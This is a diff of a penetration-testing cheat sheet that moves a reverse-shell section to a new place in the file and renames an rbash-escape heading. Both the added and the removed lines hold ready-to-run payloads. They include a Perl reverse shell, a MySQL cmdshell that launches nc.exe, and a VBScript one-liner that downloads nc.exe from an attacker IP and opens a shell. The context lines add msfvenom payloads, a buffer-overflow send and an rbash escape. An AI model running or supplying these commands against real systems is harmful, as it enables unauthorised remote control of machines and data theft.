@@ -19,8 +19,13 @@
 * Privilege Escalation
     * [Linux](#Linux)
     * [Windows](#Windows)
+* Reverse Shell
+    * [FreeBSD](#FreeBSD)
+    * [CGI](#CGI)
+    * [MySQL](#MySQL)
+    * [vbs](#vbs)
+    * [common](#common)
 * [BufferOverflow](#BufferOverflow)
-* [ReverseShell](#ReverseShell)
 * [Others](#Others)
 ## Information Gathering
 ### nmap
@@ -310,6 +315,36 @@ Don't forget to restart the dns server:
 $ sc.exe \\victim_ip stop dns
 $ sc.exe \\victim_ip start dns
 ```
+## Reverse Shell
+### FreeBSD
+```
+$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+### CGI
+```
+#!/usr/bin/perl
+require '/tmp/t.pl';
+```
+### MySQL
+```
+select cmdshell("C:\\nc.exe 10.11.0.186 4444 -e cmd.exe")
+```
+### vbs
+use it to download nc.exe and reverse shell with cscript.
+```
+$ cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs
+&@echo objXMLHTTP.open "GET","http://10.11.0.186/nc.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLH
+TTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB
+.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.
+Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.
+vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFi
+le "nc.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objA
+DOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=No
+thing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vb
+s&@echo objShell.Exec("nc.exe -e cmd.exe 10.11.0.186 4444")>>poc.vbs&cscript.exe poc.vbs"
+```
+### common
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ## BufferOverflow
 ### connect to Windows
 * Linux
@@ -339,36 +374,6 @@ $ msfvenom --platform Windows -a x86 -p windows/adduser USER=aaa PASS=aaa -f pyt
 ```
 r.send("GO" + "A"*2006 + p32(gadget) + "\x90" * 8 + buf)
 ```
-## ReverseShell
-### FreeBSD reverse shell
-```
-$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-### .cgi file reverse shell
-```
-#!/usr/bin/perl
-require '/tmp/t.pl';
-```
-### MySQL reverse shell
-```
-select cmdshell("C:\\nc.exe 10.11.0.186 4444 -e cmd.exe")
-```
-### vbs reverse shell
-use it to download nc.exe and reverse shell with cscript.
-```
-$ cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs
-&@echo objXMLHTTP.open "GET","http://10.11.0.186/nc.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLH
-TTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB
-.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.
-Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.
-vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFi
-le "nc.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objA
-DOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=No
-thing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vb
-s&@echo objShell.Exec("nc.exe -e cmd.exe 10.11.0.186 4444")>>poc.vbs&cscript.exe poc.vbs"
-```
-### common reverse shell
-- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ## Others
 ### linux execute jar file
 ```
@@ -395,7 +400,7 @@ $ PATH="$PATH":/sbin
 ```
 $ msfvenom -p java/shell_reverse_tcp LHOST=ip LPORT=port -f war > reverse.war
 ```
-### limitshell-rbash
+### escape LimitShell rbash
 * edit PATH to escape rbash
 ```
 $ BASH_CMDS[a]=/bin/sh;a
